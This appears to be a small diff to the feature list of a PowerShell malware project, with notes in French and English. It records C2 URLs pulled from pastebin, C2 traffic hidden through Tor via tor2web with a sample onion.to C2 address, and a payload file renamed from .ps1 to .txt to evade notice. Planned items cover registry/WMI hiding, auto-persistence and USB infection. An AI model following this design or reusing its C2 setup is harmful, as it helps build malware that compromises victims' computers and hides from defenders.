@@ -3,6 +3,7 @@
 FEATURES
 OK - Recupérer C2 URL sur pastebin
 OK - Use Tor to Hide c2 trafic. use url from tor2web service -> xwxwxwxwxw.onion.to  OR onion.cab > exple: [string] $Global:c2c = "https://w27ocke7kskw6cyg.onion.to/pntdr"
+- add PAYLOAD to config and generator to point to c2 pnt.ps1 actual name in the server. ALSO, change pnt.ps1 to pnt.TXT
 - Add WMI key pour cacher la valeur $pc présentement dans REGISTRY
 - Auto persist
 - USB monitor & infect
